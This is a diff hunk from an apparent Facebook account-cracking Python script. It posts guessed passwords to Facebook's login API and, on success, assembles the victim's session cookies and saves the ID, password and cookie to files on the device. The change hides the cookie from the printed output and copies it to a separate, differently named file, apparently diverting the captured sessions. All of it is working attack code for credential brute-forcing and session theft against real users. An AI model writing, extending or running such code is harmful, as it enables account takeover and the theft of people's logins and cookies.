@@ -264,9 +264,9 @@ class main_crack():
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
-                    print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
+                    print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps}\033[1;97m')
                     oks.append(rid)
-                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      ##print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
